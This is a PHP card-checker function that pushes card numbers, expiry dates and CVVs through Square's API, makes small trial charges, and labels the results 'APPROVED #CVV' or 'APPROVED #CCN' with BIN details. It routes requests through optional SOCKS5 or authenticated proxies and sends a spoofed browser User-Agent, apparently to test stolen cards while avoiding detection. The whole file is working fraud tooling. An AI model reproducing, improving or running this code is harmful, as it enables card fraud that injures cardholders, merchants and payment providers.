<?php
/**
 * Square Payment Gateway Checker
 * This gateway uses the Square API to validate cards
 */

// Function to check card with Square
function checkCardWithSquare($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig = null) {
    // Application ID should be in apiKey, Location ID can be in secretKey
    $applicationId = $apiKey;
    $locationId = $secretKey;
    
    // Check if we have the required API key
    if (empty($applicationId)) {
        return "❌ SQUARE ERROR - Missing Application ID";
    }
    
    try {
        // Initialize cURL session
        $ch = curl_init();
        
        // Format month and year
        $formattedMonth = str_pad($mes, 2, '0', STR_PAD_LEFT);
        $formattedYear = strlen($ano) === 2 ? "20" . $ano : $ano;
        $expirationDate = $formattedMonth . "/" . substr($formattedYear, -2);
        
        // Prepare nonce creation data (first step - tokenize the card)
        $cardData = json_encode([
            "card_nonce" => [
                "card" => [
                    "number" => $cc,
                    "expiration_date" => $expirationDate,
                    "cvv" => $cvv,
                    "cardholder_name" => $user_data['name']
                ]
            ]
        ]);
        
        // Set cURL options for nonce creation
        curl_setopt($ch, CURLOPT_URL, "https://connect.squareup.com/v2/cards/nonces");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $cardData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json",
            "Accept: application/json",
            "Authorization: Bearer " . $applicationId,
            "Square-Version: 2023-06-08",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]);
        
        // Set proxy if configured
        if ($proxyConfig) {
            curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
            
            if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
            }
            
            if ($proxyConfig['type'] === 'socks5') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        
        // Execute the request
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Check if the request failed
        if (curl_errno($ch)) {
            curl_close($ch);
            return "❌ SQUARE ERROR - Connection Error: " . curl_error($ch);
        }
        
        curl_close($ch);
        
        // Parse the response
        $result = json_decode($response, true);
        
        // Format BIN information
        $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
        
        // Check if nonce was created successfully
        if ($httpcode === 200 && isset($result['card_nonce'])) {
            $nonce = $result['card_nonce']['id'];
            
            // If we have both application ID and location ID, attempt to create a payment
            if (!empty($locationId)) {
                $ch = curl_init();
                
                // Generate a random amount between 1 and 5
                $amount = mt_rand(100, 500);
                
                // Prepare payment data
                $paymentData = json_encode([
                    "source_id" => $nonce,
                    "idempotency_key" => generateUUID(),
                    "amount_money" => [
                        "amount" => $amount,
                        "currency" => "USD"
                    ],
                    "autocomplete" => false,
                    "location_id" => $locationId,
                    "customer_id" => null,
                    "note" => "Card validation"
                ]);
                
                // Set cURL options for payment request
                curl_setopt($ch, CURLOPT_URL, "https://connect.squareup.com/v2/payments");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $paymentData);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "Authorization: Bearer " . $applicationId,
                    "Square-Version: 2023-06-08",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                ]);
                
                // Set proxy if configured
                if ($proxyConfig) {
                    curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
                    
                    if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
                    }
                    
                    if ($proxyConfig['type'] === 'socks5') {
                        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                    }
                }
                
                // Execute the payment request
                $response = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                
                // Check if the request failed
                if (curl_errno($ch)) {
                    curl_close($ch);
                    return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: Nonce Valid but Payment Failed - {$nonce} ]{$bin_info}";
                }
                
                curl_close($ch);
                
                // Parse the payment response
                $paymentResult = json_decode($response, true);
                
                if ($httpcode === 200 && isset($paymentResult['payment']) && isset($paymentResult['payment']['status'])) {
                    $paymentStatus = $paymentResult['payment']['status'];
                    
                    if ($paymentStatus === 'COMPLETED' || $paymentStatus === 'APPROVED') {
                        // Payment was successful
                        return "✅ APPROVED #CVV - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: Payment {$paymentStatus} - ID: {$paymentResult['payment']['id']} ]{$bin_info}";
                    } elseif ($paymentStatus === 'PENDING') {
                        // Payment is pending
                        return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: Payment {$paymentStatus} ]{$bin_info}";
                    } else {
                        // Payment failed
                        return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: Payment {$paymentStatus} ]{$bin_info}";
                    }
                } else {
                    // Payment failed
                    $errorMessage = "Unknown Error";
                    
                    if (isset($paymentResult['errors']) && is_array($paymentResult['errors']) && !empty($paymentResult['errors'])) {
                        $error = $paymentResult['errors'][0];
                        $errorMessage = isset($error['detail']) ? $error['detail'] : (isset($error['code']) ? $error['code'] : "Unknown Error");
                    }
                    
                    if (strpos($errorMessage, 'CVV') !== false || strpos($errorMessage, 'CVV2') !== false) {
                        return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: {$errorMessage} ]{$bin_info}";
                    } else {
                        return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: {$errorMessage} ]{$bin_info}";
                    }
                }
            } else {
                // We only have nonce validation
                return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: Card Nonce Valid - {$nonce} ]{$bin_info}";
            }
        } else {
            // Nonce creation failed
            $errorMessage = "Invalid Card";
            
            if (isset($result['errors']) && is_array($result['errors']) && !empty($result['errors'])) {
                $error = $result['errors'][0];
                $errorMessage = isset($error['detail']) ? $error['detail'] : (isset($error['code']) ? $error['code'] : "Unknown Error");
            }
            
            return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ SQUARE: {$errorMessage} ]{$bin_info}";
        }
    } catch (Exception $e) {
        return "❌ SQUARE ERROR - Exception: " . $e->getMessage();
    }
}
?>